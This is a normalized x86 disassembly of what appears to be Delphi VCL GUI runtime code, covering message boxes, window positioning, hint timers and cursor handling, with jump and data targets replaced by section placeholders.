cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xd8 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ eax + 0x283 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_481adc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd8 ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0xd8 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_47df8c
jmp r-xdata
mov dl 0x1
call sub_4795d4
sub_4825f0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_482663
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax ]
mov edx eax
mov ebx edx
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
setne al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48266a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448088
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_448088
mov edx [ ebp - 0x8 ]
pop eax
call j_sub_44a294
jne r-xdata
mov eax ebx
call sub_44813c
mov ebx eax
sub_482674
push ebx
push esi
push edi
mov edi edx
mov esi eax
call GetCapture
test eax eax
je r-xdata
call sub_447580
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_4825f0
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageW
call sub_4475a0
mov edx eax
mov eax ebx
call sub_439b68
mov edx [ r-xdata ]
mov eax ebx
call sub_4825f0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0xf2 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_482884
jmp r-xdata
mov ecx ebx
mov edx edi
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
jmp r-xdata
sub_4826f8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_483bb8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x170 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_476b80
mov [ ebp - 0x20 ] eax
call sub_4769d4
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_4811c4
test al al
je r-xdata
mov [ ebp - 0x48 ] 0x28
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x40 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
push 0x2
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor ecx ecx
push ebp
push sub_48286f
push [ fs : ecx ]
mov [ fs : ecx ] esp
push esi
mov eax [ ebp - 0x8 ]
push eax
push edi
push ebx
call MessageBoxW
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482876
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or esi 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x44 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x20 ]
call sub_476c44
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_4769dc
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x54 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x58 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call SetWindowPos
adc edx 0x0
sub_482884
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_48296f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x4 ]
call sub_449d80
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ebx esi
cmp [ ebx + 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_481d78
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
mov eax [ ebp - 0x4 ]
call sub_449db8
mov edx eax
mov eax edi
pop ecx
call sub_4826f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482976
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
mov esi eax
cmp ebx esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x4 ]
call sub_449d80
jmp r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax ebx
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov ebx eax
cmp [ ebx + eax * 2 - 0x2 ] 0x2e
jbe r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44a068
sub_482990
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov esi eax
xor edi edi
mov [ esp + 0x4 ] 0x1
lea eax [ esp + 0x4 ]
push eax
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax esi
call sub_482ac4
mov ebx eax
test bl bl
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edi [ eax + 0x60 ]
test edi edi
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
test edi edi
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
mov eax edi
call sub_496c14
test al al
je r-xdata
mov eax edi
call sub_496aac
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x4 ] 0x0
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov eax [ esi + 0x170 ]
mov [ esp + 0x8 ] eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
cmp [ edi + 0x294 ] 0x0
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
movzx eax bp
push eax
push 0xb01f
mov eax [ esi + 0x170 ]
push eax
call PostMessageW
mov eax esi
call sub_4831f0
test al al
je r-xdata
call sub_496868
mov [ esp + 0x8 ] eax
mov eax edi
call sub_496868
mov [ esp + 0x8 ] eax
mov eax esi
call sub_4831f0
test al al
je r-xdata
cmp [ edi + 0x278 ] 0x0
jne r-xdata
push ebp
mov eax [ esp + 0x4 ]
push eax
mov ecx [ esi + 0x4c ]
mov edx [ esp + 0x10 ]
mov eax [ esi + 0x48 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
push ebp
mov eax [ esp + 0x4 ]
push eax
mov ecx [ edi + 0x294 ]
mov edx [ esp + 0x10 ]
mov eax [ esi + 0x48 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov [ esp + 0x4 ] 0x0
sub_482ac4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x1
xor esi esi
mov eax [ rw-data ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
test bl bl
jne r-xdata
xor edx edx
call sub_477028
mov esi eax
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
cmp [ esi + 0x2fa ] 0x0
je r-xdata
test bl bl
jne r-xdata
cmp esi eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ esi + 0x2fc ]
call [ esi + 0x2f8 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x122 ] 0x0
je r-xdata
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov ebx eax
cmp [ esi + 0x2fa ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ esi + 0x2fc ]
call [ esi + 0x2f8 ]
mov ebx eax
sub_482b90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_482c0e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1 ]
push eax
mov eax edi
call sub_449db8
mov ecx eax
mov dx 0x102
mov eax esi
call sub_482ac4
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482c15
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
mov eax esi
call sub_4831f0
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_483b7c
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ esi + 0x48 ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
sub_482c20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_482c97
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1 ]
push eax
mov ecx edi
mov dx 0x1
mov eax esi
call sub_482ac4
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482c9e
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
mov eax esi
call sub_4831f0
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_483b7c
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ esi + 0x48 ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
sub_482cc0
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x84 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x84 ] al
test al al
je r-xdata
mov eax [ ebx + 0x80 ]
call sub_4481b0
xor eax eax
mov [ ebx + 0x80 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x80 ] esi
mov edx [ ebx + 0x58 ]
mov eax esi
call sub_48e120
jmp r-xdata
sub_482d24
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_47f6a0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_496868
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_47f68c
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax ebx
call sub_496868
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf0 ]
sub_482d88
push ebx
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_48c3fc
cmp eax [ ebx + 0x44 ]
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov [ ebx + 0x44 ] eax
sub_482dac
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_482df1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
push eax
push 0x0
call KillTimer
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_482d24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_482e14
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_482f7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_482d88
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_480354
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_48aae4
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_483034
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_4488a4#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x44 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
mov eax [ ebp - 0x4 ]
call sub_483438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xbc ] 0x0
jg r-xdata
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_482d24
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_42d9b0
test al al
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482f84
lea eax [ ebp - 0x10 ]
mov edx 0x2
call j_sub_44936c
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
push eax
push 0x0
push 0x0
call SetTimer
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] sub_482dac
mov eax [ ebp - 0x4 ]
call sub_482d24
sub_482f8c
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_47f684
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_47f670
movzx edx di
xor ecx ecx
call sub_48f2b0
inc esi
dec ebx
jne r-xdata
sub_482fc8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_4769b0
test eax eax
je r-xdata
mov eax ebx
call sub_481ac0
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x170 ]
push eax
call SendMessageW
mov eax ebx
call sub_481ac0
push eax
push 0xfffffff2
mov eax [ ebx + 0x170 ]
push eax
call SetClassLongW
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_482f8c
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x170 ]
push eax
call InvalidateRect
sub_483034
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x50 ]
mov edx esi
call j_sub_44a294
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x50 ]
mov edx esi
call sub_449d2c
cmp [ ebx + 0x12a ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ee00
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_451a1c
xor eax eax
push ebp
push sub_4830b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4483f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
mov edx ebx
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
jmp r-xdata
sub_4830c8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0xcf ] 0x0
je r-xdata
movzx eax bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
cmp [ rw-data ] 0x0
jne r-xdata
push 0xffffffec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x170 ]
push esi
call GetWindowLongW
or eax 0x8000000
push eax
push 0xffffffec
mov eax [ ebp + 0x8 ]
push esi
call SetWindowLongW
sub_483168
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x170 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_47f684
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_4830c8
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x1cc ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_47f670
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_4830c8
pop ecx
jmp r-xdata
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax [ ebx + 0x1cc ]
push eax
mov eax ebx
call sub_496868
push eax
call IsChild
test eax eax
jne r-xdata
sub_483210
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_483254
mov eax [ rw-data ]
push eax
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x86 ] ax
mov [ edi + 0x85 ] bl
cmp [ edi + 0x86 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_483438
sub_48327c
push ebx
push esi
push edi
add esp 0xffffffcc
mov edi ecx
mov ebx edx
mov esi eax
push esi
mov esi edi
lea edi [ esp + 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
movsx eax [ esp + 0x24 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0x26 ]
mov [ esp + 0x10 ] eax
lea ecx [ esp + 0x2c ]
lea edx [ esp + 0xc ]
mov eax ebx
call sub_48d98c
lea eax [ esp + 0x2c ]
mov dl 0x1
call sub_48c3fc
call sub_48038c
mov edi eax
test edi edi
je r-xdata
mov eax esi
call sub_483438
jmp r-xdata
cmp [ edi + 0x89 ] 0x0
jne r-xdata
add esp 0x34
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x5c ]
je r-xdata
movsx eax [ esp + 0x24 ]
mov [ esp + 0x14 ] eax
movsx eax [ esp + 0x26 ]
mov [ esp + 0x18 ] eax
lea ecx [ esp + 0x2c ]
lea edx [ esp + 0x14 ]
mov eax ebx
call sub_48d98c
lea edx [ esp + 0x2c ]
lea eax [ esi + 0x60 ]
call sub_432a8c
xor al 0x1
mov al 0x1
jmp r-xdata
movzx ebx [ esi + 0x54 ]
test bl bl
je r-xdata
test al al
je r-xdata
mov eax [ esi + 0x74 ]
mov [ esp ] eax
mov eax [ esi + 0x7c ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_483438
mov [ esi + 0x54 ] bl
mov [ esi + 0x5c ] edi
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_483210
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
movzx ecx bl
mov edx 0xb041
mov eax edi
call sub_48f2b0
test bl bl
je r-xdata
mov [ esi + 0x54 ] bl
mov [ esi + 0x5c ] edi
lea eax [ esp + 0x4 ]
push eax
call GetCursorPos
lea edx [ esp + 0x4 ]
mov eax esi
call sub_483708
jmp r-xdata
sub_48338c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_483254
movzx eax [ ebx + 0x85 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_483708
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_4833c4
jmp r-xdata
sub_4833c4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x80 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_496c14
test al al
je r-xdata
mov eax [ ebx + 0x80 ]
call sub_496868
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ ebx + 0x80 ]
mov edx [ eax ]
call [ edx + 0xec ]
test al al
je r-xdata
mov cl 0x1
mov edx [ ebx + 0x70 ]
mov eax ebx
call sub_483210
push 0x0
mov eax [ ebx + 0x80 ]
call sub_496868
push eax
call ShowWindow
xor edx edx
mov eax [ ebx + 0x80 ]
call sub_48deb0
jmp r-xdata
sub_483438
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4833c4
xor eax eax
mov [ ebx + 0x5c ] eax
mov [ ebx + 0x54 ] 0x0
call sub_480514
mov eax ebx
call sub_483254
sub_483470
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_4835b4
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_46fb64
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_447474
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_483585
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_46fc20
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48358c
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4474a8
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_483460
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_483460
mov [ ebp - 0x4 ] eax
sub_48358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_4835c8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x80 ]
test edx edx
jne r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax edx
mov eax [ eax ]
mov esi eax
cmp ebx esi
setne al
mov al 0x1
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax edx
call sub_4481b0
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x80 ] eax
test al al
je r-xdata
sub_483628
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
xor edx edx
push ebp
push sub_4836d6
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4836dd
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov edx r-xdata
movzx eax [ ebx ]
call sub_434c14
test al al
je r-xdata
mov eax ebx
call sub_43aef8
mov ebx eax
mov ecx ebx
sub ecx esi
sar ecx 0x1
jns r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_449e68
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x80 ]
mov eax [ eax + 0x260 ]
mov edx [ ebp - 0x4 ]
call sub_46e724
mov edi eax
cmp edi [ ebp - 0x8 ]
jle r-xdata
adc ecx 0x0
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x8 ] edi
cmp [ ebx ] 0xa
jne r-xdata
add ebx 0x2
add ebx 0x2
sub_483708
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0x4c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x44 ]
mov edx [ r-xdata ]
call sub_44a6cc
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_483aa4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x54 ] 0x0
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
